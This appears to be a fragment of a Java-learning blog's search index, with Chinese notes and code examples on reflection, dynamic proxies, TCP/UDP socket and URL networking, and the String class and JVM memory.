System.out.println(\"info方法，我是一个人\"); } @Override public int compareTo(String o) { return 0; } } Creature.java package cn.xpshuai.java2; import java.io.Serializable; public class Creature\u003cT\u003e implements Serializable { private char gender; public double weight; public void breath(){ System.out.println(\"生物呼吸\"); } public void eat(){ System.out.println(\"生物吃东西\"); } } MyInterface.java package cn.xpshuai.java2; public interface MyInterface { void info(); } MyAnnotation.java package cn.xpshuai.java2; import java.lang.annotation.Retention; import java.lang.annotation.RetentionPolicy; import java.lang.annotation.Target; import static java.lang.annotation.ElementType.*; @Target({TYPE, FIELD, METHOD, PARAMETER, CONSTRUCTOR, LOCAL_VARIABLE}) @Retention(RetentionPolicy.RUNTIME) public @interface MyAnnotation { String value() default \"hello\"; } 测试代码(java3包里面)： package cn.xpshuai.java3; import cn.xpshuai.java2.Person; import org.junit.Test; import java.lang.reflect.Field; import java.lang.reflect.Modifier; /** * @author: 剑胆琴心 * @create: 2021-02-05 15:28 * @功能：获取当前运行时类的属性结构 */ public class FieldTest { @Test public void test(){ Class clazz = Person.class; //获取属性结构 //getFields(): 获取当前运行时类及其父类中声明为public访问权限的属性 Field[] fields = clazz.getFields(); for(Field f: fields){ System.out.println(f); } //获取声明的属性结构 //getDeclaredFields(): 获取当前运行时类当中声明的所有属性(与权限无关)，不包含父类中的属性 Field[] declaredFields = clazz.getDeclaredFields(); for(Field f: declaredFields){ System.out.println(f); } System.out.println(\"******************\"); } //权限修饰符 数据类型 变量名 = ... @Test public void test1(){ Class clazz = Person.class; Field[] declaredFields = clazz.getDeclaredFields(); for(Field f: declaredFields){ //1.权限修饰符 //返回的是数字(在Modifier类中有) int modifiers = f.getModifiers(); // System.out.println(modifiers); System.out.print(Modifier.toString(modifiers) + \"\\t\"); //翻译回来 //2.数据类型 Class\u003c?\u003e types = f.getType(); System.out.print(types.getName() + \"\\t\"); //3.变量名 String fname = f.getName(); System.out.print(fname); System.out.println(); } } } package cn.xpshuai.java3; import cn.xpshuai.java2.Person; import org.junit.Test; import java.lang.annotation.Annotation; import java.lang.reflect.Method; import java.lang.reflect.Modifier; /** * @author: 剑胆琴心 * @create: 2021-02-05 15:43 * @功能：获取当前运行时类的方法结构 框架 = 注解+反射+涉及模式 */ public class MethodTest { @Test public void test(){ Class\u003cPerson\u003e clazz = Person.class; //获取方法结构 //getMethods():获取当前运行时类及其父类中声明为public访问权限的方法 Method[] methods = clazz.getMethods(); for(Method m: methods){ System.out.println(m); } //getDeclaredMethods():获取当前运行时类当中声明的所有方法(与权限无关)，不包含父类中的方法 Method[] dmethods = clazz.getDeclaredMethods(); for(Method m: dmethods){ System.out.println(m); } } /* 获取运行时类的内部结构 @Xxx 权限修饰符 返回值类型 方法名(参数类型1 形参名1, ...) throws XxxException{} */ @Test public void test1(){ Class clazz = Person.class; Method[] dmethods = clazz.getDeclaredMethods(); for(Method m: dmethods){ //1.获取方法声明的注解 Annotation[] annotations = m.getAnnotations(); for(Annotation a: annotations){ System.out.println(a); // @cn.xpshuai.java2.MyAnnotation(value=hello) } //2.权限修饰符 System.out.print(Modifier.toString(m.getModifiers()) + \"\\t\"); //3.返回值类型 System.out.print(m.getReturnType().getName() + \"\\t\"","date":"2021-02-06","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%88%9D%E6%8E%A2/:0:5","tags":["Java学习笔记","Java反射","动态代理"],"title":"Java学习之反射初探","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%88%9D%E6%8E%A2/"},{"categories":["Java学习"],"content":"调用运行时类的指定结构(重要，掌握) 主要是调 方法、其次是属性和构造器 package cn.xpshuai.java3; import cn.xpshuai.java2.Person; import org.junit.Test; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; /** * @author: 剑胆琴心 * @create: 2021-02-06 9:37 * @功能： 调用运行时类的指定结构(重要，掌握) \u003e 主要是调方法、其次是属性和构造器 */ public class ReflectionTest { /* 这个不需要掌握 */ @Test public void test() throws NoSuchMethodException, NoSuchFieldException, IllegalAccessException, InstantiationException { Class clazz = Person.class; System.out.println(clazz); //创建运行时类的对象 Person p = (Person) clazz.newInstance(); System.out.println(p); //获取指定的属性(通常不采用此方法，因为非public的无法获取) Field id = clazz.getField(\"id\"); //设置当前属性的值 // set():参数1-\u003e指明设置哪个对象的属性 参数2-\u003e将此属性值设置为多少 id.set(p, 1001); //获取当前属性的值 // get(): 参数1--\u003e获取哪个对象的当前属性 int pid = (int)id.get(p); System.out.println(pid); } /* 需要掌握 标准的，操作运行时类中的指定的属性 */ @Test public void test1() throws Exception{ Class clazz = Person.class; System.out.println(clazz); //创建运行时类的对象 Person p = (Person) clazz.newInstance(); //这个常用！！！ //1.getDeclaredField(String fieldName):获取指定变量名的属性 Field name = clazz.getDeclaredField(\"name\"); //2.保证当前属性可访问 name.setAccessible(true); //权限不够的，设置允许方法 //3.获取、设置指定对象的属性值 name.set(p, \"Jerry\"); System.out.println(name.get(p)); System.out.println(p); } /* 需要掌握 标准的，操作运行时类中的指定的方法 */ @Test public void test2() throws Exception{ Class clazz = Person.class; System.out.println(clazz); //创建运行时类的对象 Person p = (Person) clazz.newInstance(); //这个常用！！！ //1.getDeclaredMethod(String methodName):获取指定变量名的属性 //参数1：指明获取的方法的名称。 参数2：指明获取的方法的形参列表 Method show = clazz.getDeclaredMethod(\"show\", String.class); //2.保证当前方法可访问 show.setAccessible(true); //权限不够的，设置允许方法 //3.调用invoke()执行: 参数1：方法的调用者， 参数2：给方法形参赋值的实参 //invoke()的返回值即为对应类中调用的方法的返回值 // show.invoke(p, \"CHN\"); Object returnVal = show.invoke(p, \"CHN\"); System.out.println(returnVal); System.out.println(\"**************\"); //调用静态方法 // private static void showDesc() Method sd = clazz.getDeclaredMethod(\"showDesc\"); sd.setAccessible(true); //调用，第一个参数写当前class或null sd.invoke(Person.class); //如果该运行时类的方法没有返回值，则此invoke的返回值为null // sd.invoke(null); //写null也行，丝毫不影响 } /* 操作运行时类中的指定的构造器（不太常用，因为常用newInstance()来实例化） */ @Test public void test3() throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { Class clazz = Person.class; //1.获取指定的构造器（参数：只需指明参数列表） Constructor constructor = clazz.getDeclaredConstructor(String.class); //2.保证此构造器可访问 constructor.setAccessible(true); //3.创建运行时类的对象 Person per = (Person)constructor.newInstance(\"Tom\"); System.out.println(per); } } ","date":"2021-02-06","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%88%9D%E6%8E%A2/:0:6","tags":["Java学习笔记","Java反射","动态代理"],"title":"Java学习之反射初探","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%88%9D%E6%8E%A2/"},{"categories":["Java学习"],"content":"反射的应用: 动态代理 代理设计模式的原理: 使用一个代理将对象包装起来,然后用该代理对象取代康始对象。任何对原始对象的调用都要通过代理。代理对象决定是否以及何时将方法调用转到原始对象上。 之前为大家讲解过代理机制的操作，属于静态代理，特征是代理类和目标对象的类都是在编译期间确定下来，不利于程序的扩展。同时，每一个代理类只能为一个接口服务，这样一来程序开发中必然产生过多的代理。最好可以通过一个代理类完成全部的代理功能。 动态代理是指客户通过代理类来调用其它对象的方法，并且是在程序运行时根据需要动态创建目标类的代理对象。 动态代理使用场合: 调试 远程方法调用 动态代理相比于静态代理的优点: 抽象角色中（接口）声明的所有方法都被转移到调用处理器一个集中的方法中处理，这样，我们可以更加灵活和统一的处理众多的方法。 先看一下之前学过的静态代理： package cn.xpshuai.java4; /** * @author: 剑胆琴心 * @create: 2021-02-06 13:21 * @功能：静态代理的例子 * * 特点：代理类和被代理类在编译期间，就确定了下来 */ interface ClothFactory{ void produceCloth(); } //代理类 class ProxyClothFactory implements ClothFactory{ private ClothFactory factory; // 就用被代理类对象进行实例化 public ProxyClothFactory(ClothFactory factory){ this.factory = factory; } @Override public void produceCloth() { System.out.println(\"代理工厂做一些准备工作...\"); factory.produceCloth(); System.out.println(\"代理工厂做一些后续的收尾工作...\"); } } //被代理类 class NikeClothFactory implements ClothFactory{ @Override public void produceCloth() { System.out.println(\"Nike工厂生产运动服\"); } } //测试 public class StaticProxyTest { public static void main(String[] args) { //创建被代理类的对象 ClothFactory nike = new NikeClothFactory(); //多态的形式 //创建代理类的对象 ProxyClothFactory proxyClothFactory = new ProxyClothFactory(nike); //代理类的对象调方法 proxyClothFactory.produceCloth(); } } 动态代理的举例(要求，明白这个逻辑就行，不需要死记代码)： package cn.xpshuai.java4; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; /** * @author: 剑胆琴心 * @create: 2021-02-06 13:33 * @功能：动态代理的举例 */ interface Human{ String getBelief(); void eat(String food); } //被代理类 class SuperMan implements Human{ @Override public String getBelief() { return \"I believe I can fly.\"; } @Override public void eat(String food) { System.out.println(\"我喜欢吃：\" + food); } } /* 要想实现动态代理，需要解决的问题？ 1.如何根据加载到内存中的被代理类，动态的创建一个代理类及其对象 2.当通过代理类的对象调用方法时，如何动态的去调用被代理类中的同名方法 */ class ProxyFactory{ //调用此方法，返回一个代理类的对象，解决问题1 public static Object getProxyInstance(Object obj){ //obj：被代理类的对象 MyInvocationHandler handler = new MyInvocationHandler(); handler.bind(obj); return Proxy.newProxyInstance(obj.getClass().getClassLoader(), obj.getClass().getInterfaces(), handler); } } class MyInvocationHandler implements InvocationHandler{ private Object obj; //需要使用被代理类的对象进行赋值 public void bind(Object obj){ this.obj = obj; } //当我们通过代理类的对象，请用方法a时，就会自动调用如下的犯法:invoke() //将被代理类要指定的方法a的功能就声明在invoke()中 @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { // method:即为代理类对象调用的方法，此方法也就作为了被代理类对象要调用的方法 // obj: 被代理类的对象 Object returnVal = method.invoke(obj, args); //上述方法的返回值就作为当前类中的invoke()的返回值 return returnVal; } } //测试 public class ProxyTest { public static void main(String[] args) { SuperMan superMan = new SuperMan(); // proxyInstance: 代理类的对象 Human proxyInstance = (Human)ProxyFactory.getProxyInstance(superMan); //当通过代理类对象调用方法时，会自动的调用被代理类中同名的方法 String belief = proxyInstance.getBelief(); System.out.println(belief); proxyInstance.eat(\"麻辣烫\"); //只需要提供被代理类和接口就行啦 System.out.println(\"*************\"); NikeClothFactory nikeClothFactory = new NikeClothFactory(); ClothFactory proxyClothInstance1 = (ClothFactory)ProxyFactory.getProxyInstance(nikeClothFactory); proxyClothInstance1.produceCloth(); } } AOP与动态代理举例： 面向切面编程 package cn.xpshuai.java4; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; /** * @author: 剑胆琴心 * @create: 2021-02-06 13:33 * @功能：动态代理的举例 */ interface Human{ String getBelief(); void eat(String food); } //被代理类 class SuperMan implements Human{ @Override public String getBelief() { return \"I believe I can fly.\"; } @Override public void eat(String food) { System.out.println(\"我喜欢吃：\" + food); } } /* 要想实现动态代理，需要解决的问题？ 1.如何根据加载到内存中的被代理类，动态的创建一个代理类及其对象 2.当通过代理类的对象调用方法时，如何动态的去调用被代理类中的同名方法 */ class ProxyFactory{ //调用此方法，返回一个代理类的对象，解决问题1 public static Object getProxyInstance(Object obj){ //obj：被代理类的对象 MyInvocationHandler handler = new MyInvocationHandler(); handler.bind(obj); return Proxy.newProxyInstance(obj.getClass().getClassLoader","date":"2021-02-06","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%88%9D%E6%8E%A2/:0:7","tags":["Java学习笔记","Java反射","动态代理"],"title":"Java学习之反射初探","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%88%9D%E6%8E%A2/"},{"categories":["Java学习"],"content":"网络编程概述 Java提供的网络类库，可以实现无痛的网络连接，联网的底层细节被l隐藏在 Java的本机安装系统里，由JVM进行控制。并且Java实现了一个跨平台的网络库，程序员面对的是一个统一的网络编程环境。 计算机网络: 把分布在不同地理区域的计算机与专门的外部设备用通信线路互连成一个规模大、功能强的网络系统，从而使众多的计算机可以方便地互相传递信息、共享硬件、软件、数据信息等资源。 网络编程的目的: 直接或间接地通过网络协议与其它计算机实现数据交换，进行通讯。 网络编程中有两个主要的问题: 如何准确地定位网络上一台或多台主机; 定位主机上的特定的应用 找到主机后如何可靠高效地进行数据传输 网络模型： OSI参考模型 TCP/IP参考模型 五层模型 ","date":"2021-01-31","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%88%9D%E6%B6%89/:0:1","tags":["Java","学习笔记","网络编程"],"title":"Java学习之网络编程初涉","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%88%9D%E6%B6%89/"},{"categories":["Java学习"],"content":"网络通信要素概述 IP和端口号 网络通信协议 通信要素1：IP和端口号 IP: Java使用InetAddress类代替IP 唯一的标识Internet上的计算机（通信实体) 本地回环地址(hostAddress):127.0.0.1 主机名(hostName): localhost IP地址分类方式1:IPV4和IPV6 IPV4:4个字节组成，4个0-255。大概42亿，30亿都在北美，亚洲4亿。2011年初已经用尽。以点分十进制表示，如192.168.0.1 IPV6:128位（16个字节），写成8个无符号整数，每个整数用四个十六进制位表示，数之间用冒号(:）分开，如:3ffe:3201:1401:1280:c8ff:fe4d:db39:1984 IP地址分类方式2: 公网地址(万维网使用)和私有地址(局域网使用)。 公网地址 私有地址 A 1.0.0.0 -127.0.0.0 10.0.0.0/8 —-\u003e 10.0.0.0~10.255.255.255（A类） B 128.0.0.0-191.255.255.255 172.16.0.0/12 —-\u003e 172.16.0.0~172.31.255.255（B类） C 192.0.0.0-223.255.255.255 192.168.0.0/16 —-\u003e 192.168.0.0~192.168.255.255（C类） D 240.0.0.0-255.255.255.254(多播) 端口号： 端口号标识正在计算机上运行的进程（程序） 不同的进程有不同的端口号 被规定为一个16位的整数0~65535。 端口分类: 公认端口: 0~1023。被预先定义的服务通信占用（如:HTTP占用端口8o，FTP占用端口21，TeInet占用端口23) 注册端口: 1024~49151。分配给用户进程或应用程序。(如:Tomcat占用端口8080，MySQL占用端口3306，Oracle占用端口1521等）。 动态/私有端口: 49152~65535。 端口号与IP地址的组合得出一个网络套接字:Socket。 /* * 一、Java使用InetAddress类代替IP * * * *三、IP和端口号 * 1.实例化InetAddress：两个方法：getByName(String host)： 获取ip、getLocalHost(): 获取本机dip * 两个常用方法：getHostName(): 获取主机名称、getHostAddress() : 获取ip地址 */ @Test public void test() throws UnknownHostException { //实例化InetAddress // getByName(String host)： 获取ip // getLocalHost(): 获取本机dip InetAddress inet1 = InetAddress.getByName(\"192.168.0.112\"); //ip InetAddress inet2 = InetAddress.getByName(\"www.sina.com\"); //域名方式，获取ip InetAddress inet3 = InetAddress.getByName(\"127.0.0.1\"); InetAddress inet4 = InetAddress.getLocalHost(); System.out.println(inet1); System.out.println(inet2); System.out.println(inet3); System.out.println(inet4); //getHostName(): 获取主机名称 System.out.println(inet2.getHostName()); //getHostAddress() : 获取ip地址 System.out.println(inet2.getHostAddress()); } 通信要素2：网络协议 网络通信协议: 计算机网络中实现通信必须有一些约定，即通信协议，对速率、传输代码、代码结构、传输控制步骤、出错控制等制定标准。 计算机网络通信涉及内容很多，比如指定源地址和目标地址，加密解密，压缩解压缩，差错控制，流量控制，路由控制，如何实现如此复杂的网络协议呢?通信协议分层的思想 在制定协议时，把复杂成份分解成一些简单的成份，再将它们复合起来。最常用的复合方式是层次方式，即同层间可吆通信、上一层可以调用下一层，而与再下一层不发生关系。各层互不影响，利于系统的开发和扩展。 传输层协议中有两个非常重要的协议: 传输控制协议TCP(Transmission Control Protocol) 用户数据报协议UDP(User Datagram Protocol)。 TCP/IP以其两个主要协议: **传输控制协议(TCP)和网络互联协议(IP)**而得名，实际上是一组协议，包括多个具有不同功能且互为关联的协议。 IP(Internet Protocol)协议是网络层的主要协议，支持网间互连的数据通信 TCP/IP协议模型从更实用的角度出发，形成了高效的四层体系结构，即物理链路层、IP层、传输层和应用层。 TCP协议: 使用TCP协议前，须先建立TCP连接，形成传输数据通道 传输前，采用**“三次握手”方式，点对点通信，是可靠**的 TCP协议进行通信的两个应用进程:客户端、服务端。 在连接中可进行大数据量的传输 传输完毕，需释放已建立的连接，效率低 UDP协议: 将数据、源、目的封装成数据包，不需要建立连接 每个数据报的大小限制在64K内 发送不管对方是否准备好，接收方收到也不确认，故是不可靠的 可以广播发送 发送数据结束时无需释放资源，开销小，速度快 ","date":"2021-01-31","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%88%9D%E6%B6%89/:0:2","tags":["Java","学习笔记","网络编程"],"title":"Java学习之网络编程初涉","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%88%9D%E6%B6%89/"},{"categories":["Java学习"],"content":"TCP网络编程 实例1：客户端发送信息给服务端，服务端将信息显示在控制台上 //客户端 @Test public void client(){ InetAddress inet = null; Socket socket = null; OutputStream os = null; try { //1.创建socket对象 inet = InetAddress.getByName(\"127.0.0.1\"); //设置服务端的ip socket = new Socket(inet, 8899); //2.获取输出流，用于输出数据 os = socket.getOutputStream(); //3.写出数据的操作 os.write(\"你好，我是客户端mm\".getBytes()); } catch (Exception e) { e.printStackTrace(); }finally { //4.关闭 try { if(os != null){ os.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(socket != null){ socket.close(); } } catch (IOException e) { e.printStackTrace(); } } } //服务端 @Test public void server(){ ServerSocket ss = null; Socket socket = null; InputStream is = null; ByteArrayOutputStream baos = null; try{ //1.创建服务器端的ServerSocket，指明自己的端口号 ss = new ServerSocket(8899); //2.调用accept()表示接收来自于客户端的socket socket = ss.accept(); //3.获取输入流 is = socket.getInputStream(); // 不建议这么写：容易出现乱码 // byte[] buffer = new byte[20]; // int len; // while ((len = is.read(buffer)) != -1){ // String str = new String(buffer,0, len); // System.out.println(str); // } //4.读取输入流中的数据 //用ByteArrayOutputStream的形式来输出 baos = new ByteArrayOutputStream(); byte[] buffer = new byte[5]; int len; while ((len = is.read(buffer)) != -1){ baos.write(buffer,0,len); //写到内置的数组中了 } System.out.println(baos.toString()); //把内部的数组输出成string System.out.println(\"收到来自客户端ip：\" + socket.getInetAddress().getHostAddress() + \"个数据\"); }catch (Exception e){ e.printStackTrace(); }finally { //5.关闭 try { if(baos != null){ baos.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(is != null){ is.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(socket != null){ socket.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(ss != null){ ss.close(); } } catch (IOException e) { e.printStackTrace(); } } } 实例2：客户端发送文件给服务端，服务端将文件保存在本地。 //客户端2 @Test public void client2(){ InetAddress inet = null; Socket socket = null; OutputStream os = null; FileInputStream fis = null; try { //1.创建socket对象 inet = InetAddress.getByName(\"127.0.0.1\"); //设置服务端的ip socket = new Socket(inet, 8899); //2.获取流 os = socket.getOutputStream(); fis = new FileInputStream(new File(\"d:\\\\io\\\\1.png\")); //3.写出数据的操作 byte[] buffer = new byte[1024]; int len; while ((len = fis.read(buffer)) != -1){ os.write(buffer,0,len); } } catch (Exception e) { e.printStackTrace(); }finally { //4.关闭 try { if(fis != null){ fis.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(os != null){ os.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(socket != null){ socket.close(); } } catch (IOException e) { e.printStackTrace(); } } } //服务端2 @Test public void server2(){ ServerSocket ss = null; Socket socket = null; InputStream is = null; FileOutputStream fos = null; try{ //1.创建服务器端的ServerSocket，指明自己的端口号 ss = new ServerSocket(8899); //2.调用accept()表示接收来自于客户端的socket socket = ss.accept(); //3.获取输入流 is = socket.getInputStream(); fos = new FileOutputStream(new File(\"d:\\\\io\\\\1_out.png\")); //3.写出数据的操作 byte[] buffer = new byte[1024]; int len; while ((len = is.read(buffer)) != -1){ fos.write(buffer,0,len); //写入文件数据到本地 } System.out.println(\"收到来自客户端ip：\" + socket.getInetAddress().getHostAddress() + \"个数据\"); }catch (Exception e){ e.printStackTrace(); }finally { //5.关闭 try { if(fos != null){ fos.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(is != null){ is.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(socket != null){ socket.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(ss != null){ ss.close(); } } catch (IOException e) { e.printStackTrace(); } } } 实例3：从客户端发送文件给服务端，服务端保存到本地。并返回“发送成功”给客户端。并关闭相应的连接。 //客户端3 @Test public void client3(){ InetAddress inet = null; Socket socket = null; OutputStream os = null; FileInputStream fis = null; InputStream is = null; ByteArrayOutputStream baos = null; try { //1.创建socket对象 inet = InetAddress.getByName(\"127.0.0.1\"); //设置服务端的ip socket = new Socket(inet, 8899); //2.获取流 os = socket.get","date":"2021-01-31","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%88%9D%E6%B6%89/:0:3","tags":["Java","学习笔记","网络编程"],"title":"Java学习之网络编程初涉","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%88%9D%E6%B6%89/"},{"categories":["Java学习"],"content":"UDP网络编程 类DatagramSocket和 DatagramPacket实现了基于UDP 协议网络程序。 UDP数据报通过数据报套接字DatagramSocket发送和接收，系统不保证UDP数据报一定能够安全送到目的地，也不能确定什么时候可以抵达。 DatagramPacket对象封装了UDP数据报，在数据报中包含了发送端的IP地址和端口号以及接收端的IP地址和端口号。 UDP协议中每个数据报都给出了完整的地址信息，因此无须建立发送方和接收方的连接。如同发快递包裹一样。 package cn.xpshuai.java1; import org.junit.Test; import java.io.IOException; import java.net.DatagramPacket; import java.net.DatagramSocket; import java.net.InetAddress; /** * @author: 剑胆琴心 * @create: 2021-01-31 11:54 * @功能：UDP网络编程 * * * 例子： * */ public class UDPTest { //发送端 @Test public void send() throws IOException { DatagramSocket socket = new DatagramSocket(); String str = \"我是UDP数据包的大导弹\"; byte[] data = str.getBytes(); InetAddress inet = InetAddress.getLocalHost(); DatagramPacket packet = new DatagramPacket(data,0,data.length,inet, 9090); socket.send(packet); socket.close(); } //接收端 @Test public void receive() throws IOException{ DatagramSocket socket = new DatagramSocket(9090); //指定端口号 byte[] buffer = new byte[1024]; DatagramPacket packet = new DatagramPacket(buffer,0,buffer.length); socket.receive(packet); System.out.println(new String(packet.getData(), 0, packet.getLength())); socket.close(); } } ","date":"2021-01-31","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%88%9D%E6%B6%89/:0:4","tags":["Java","学习笔记","网络编程"],"title":"Java学习之网络编程初涉","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%88%9D%E6%B6%89/"},{"categories":["Java学习"],"content":"URL编程 概述 URL(Uniform Resource Locator): 统一资源定位符，它表示Internet上某一资源的地址。 它是一种具体的UR，即URL可以用来标识一个资源，而且还指明了如何locate这个资源。 通过URL我们可以访问Internet上的各种网络资源，比如最常见的 www，ftp站点。浏览器通过解析给定的URL可以在网络上查找相应的文件或其他资源。 URL的基本结构由5部分组成: \u003c传输协议\u003e:\u003c主机名\u003e:\u003c端口号\u003e/\u003c文件名\u003e#片段名?参数列表 例如: http://192.168.1.100:8080/helloworld/index.jsp#a?username=shkstart\u0026password=123\u003e 片段名: 即锚点，例如看小说，直接定位到章节 参数列表格式: 参数名=参数值\u0026参数名=参数值.... URL类构造器 URL类的方法 一个URL对象生成后，其属性是不能被改变的，但可以通过它给定的方法来获取这些属性: public string getProtocol() //获取该URL的协议名 public String getHost( ) //获取该URL的主机名 public String getPort( ) //获取该URL的端口号 public String getPath( ) //获取该URL的文件路径 public String getfile( ) //获取该URL的文件名 public String getQuery( ) //获取该URL的查询名 try{ URL url = new URL(\"http://www.xpshuai.cn/posts/29903/#toc-heading-8\"); System.out.println(url.getProtocol()); System.out.println(url.getHost()); System.out.println(url.getPort()); System.out.println(url.getPath()); System.out.println(url.getFile()); System.out.println(url.getQuery()); }catch (Exception e){ e.printStackTrace(); } **例子：**实现服务端数据下载 //实现服务端数据下载 @Test public void urlTest2() { HttpURLConnection urlConnection = null; InputStream is = null; FileOutputStream fos = null; try{ URL url = new URL(\"http://www.xpshuai.cn/medias/featureimages/15.jpg\"); urlConnection = (HttpURLConnection) url.openConnection(); //真正的去获取 urlConnection.connect(); is = urlConnection.getInputStream(); //获取到输入流 fos = new FileOutputStream(\"d:\\\\io\\\\pic.jpg\"); byte[] buffer = new byte[1024]; int len; while ((len = is.read(buffer)) != -1){ fos.write(buffer, 0, len); } }catch (Exception e){ e.printStackTrace(); }finally { try { if(is != null){ is.close(); } } catch (IOException e) { e.printStackTrace(); } try { if(fos != null){ fos.close(); } } catch (IOException e) { e.printStackTrace(); } if (urlConnection != null) { urlConnection.disconnect(); } } } ","date":"2021-01-31","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%88%9D%E6%B6%89/:0:5","tags":["Java","学习笔记","网络编程"],"title":"Java学习之网络编程初涉","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%88%9D%E6%B6%89/"},{"categories":["Java学习"],"content":"String类 基础知识 String类: 代表字符串。Java程序中的所有字符串字面值（如\"abc\"）都作为此类的实例实现。 String是一个final类，代表不可变的字符序列。 字符串是常量，用双引号引起来表示。它们的值在创建之后不能更改。 String对象的字符内容是存储在一个字符数组value[]中的。 字符串常量池： 三种JVM： Sun公司的HotSpot（使用的较多） BEA公司的JRockit IBM公司的J9 VM Heap 堆 —个JVM实例只存在一个堆内存，堆内存的大小是可以调节的。类加载器读取了类文件后，需要把类、方法、常变量放到堆内存中，保存所有引用类型的真实信息，以方便执行器执行，堆内存分为三部分︰ Young Generation Space新生区 Young Tenure generation space养老区 old Permanent Space永久存储区 Perm 事实上永久区是划分在方法区的： 永久区： ​ 永久存储区是一个常驻内存区域，用于存放JDK自身所携带的Class,Interface 的元数据，也就是说它存储的是运行环境必须的类信息，被装载进此区域的数据是不会被垃圾回收器回收掉的，关闭JVM才会释放此区域所占用的内存。 ​ 如果出现java.lang.OutOfMemoryError: PermGen space，说明是Java虚拟机对永久代Perm内存设置不够。一般出现这种情况，都是程序启动需要加载大量的第三方jar包。例如:在一个Tomcat下部署了太多的应用。或者大量动态反射生成的类不断被加载，最终导致Perm区被占满。 Jdk1.6及之前:常量池分配在永久代, Jdk1.6在方法区 Jdk1.7:有，但已经逐步“去永久代”，1.7在堆 Jdk1.8及之后:无，1.8在元空间 String对象的创建： string str = \"hello\"; //本质上this.value = new char[0]; String s1 = new String(); //this.value = original.value; String s2 = new string(String origina1); //this.value = Arrays.copyof(value，value.length); string s3 = new String(char[] a); String s4 = new String(char[]a,int startIndex,int count); 两种创建方式的区别： 字符串的特性： package cn.xpshuai.java1; import org.junit.Test; /** * @author: 剑胆琴心 * @create: 2021-01-19 10:44 * @功能：String的使用 * */ public class StringTest { /** * 1.String声明为final，不可被继承 * 2.String实现了Serializable接口：表示字符串是支持序列化的 * 实现了Comparable接口：表示可以比较大小 * 3.String内部定义了final char[] value用于存储字符数据 * 4.String代表不可变的字符序列 * 体现： * 1.当对字符串重新赋值时，需要重写指定内存区域赋值，不能使用原有的value进行赋值。 2.当对现有的字符串进行连接操作时，也需要重新指定内存区域赋值，不能使用原有的地址的value进行赋值 * 3.当调用replace()修改字符串或字符时，也需要重新指定内存区域赋值，不能使用原有的地址的value进行赋值 *5.通过字面量方式(区别于new)给一个字符串赋值，此时的字符串值声明在字符串常量池中,字符串常量池中是不会存储相同内容的字符串的 */ @Test public void test1(){ String s1 = \"asd\"; //字面量 String s2 = \"asd\"; System.out.println(s1 == s2); //不是基本数据类型，比较s1和s2的地址池 true s1 = \"hello\"; System.out.println(s1 == s2); //比较s1和s2的地址池 false System.out.println(s1); System.out.println(s2); String s3 = \"asd\"; s3 += \"fgh\"; System.out.println(s3); // 拼接了，还得新造一个，不能直接在原来地址上添加 System.out.println(s2); String s4 = \"asd\"; String s5 = s4.replace('a', '6'); //也是新造，不能在原地址区进行任何修改 System.out.println(s4); System.out.println(s5); } /** * String的实例化方式： 方式1：通过字面量定义的方式 方式2：通过 new + 构造器的方式 面试题: string s = new String(\"abc\");方式创建对象，在内存中创建了几个对象? 答：两个，一个是堆空间中new的，另一个是char[]对象的常量池中的数据\"abc\" */ @Test public void test2(){ //此时的s1和s2的数据是声明在方法区中的字符串常量池中 String s1 = \"java\"; String s2 = \"java\"; //通过 new + 构造器的方式：:此时的s3和s4保存的地址值，是数据在堆空间中开辟空间以后对应的地址值。 String s3 = new String(\"java\"); String s4 = new String(\"java\"); System.out.println(s1 == s2); //true System.out.println(s1 == s3); //false System.out.println(s3 == s4); //false // String中equals()比较的是值，==比较的是地址 // 通过字面量定义的str会存储在字符串常量池中 } /** * 结论：1.常量与常量的拼接结果在常量池。且常量池中不会存在相同内容的常量 * 2.只要其中有一个是变量，结果就在堆中 * 